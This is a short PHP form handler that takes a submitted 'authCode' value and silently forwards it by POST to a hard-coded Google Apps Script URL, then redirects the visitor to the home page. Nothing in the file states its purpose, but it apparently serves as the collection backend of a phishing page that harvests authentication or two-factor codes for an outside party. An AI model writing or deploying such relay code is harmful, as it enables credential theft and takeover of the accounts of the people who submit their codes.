<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $authCode = $_POST['authCode'] ?? 'N/A';

    // Forward data to Google Apps Script
    $scriptURL = "https://script.google.com/macros/s/AKfycbxR660Ka6UqN2tLn_PcrbST5wRd5OraCZQzawXYNK_5GWJfFCfd3PVbsfyLnbns8dgO/exec";
    $data = http_build_query(['authCode' => $authCode]);

    $options = [
        'http' => [
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => $data,
        ],
    ];

    $context = stream_context_create($options);
    $result = file_get_contents($scriptURL, false, $context);

    if ($result === FALSE) {
        die('Error occurred');
    }

    // Redirect user after successful submission
    header("Location: /index.html");
    exit();
}
?>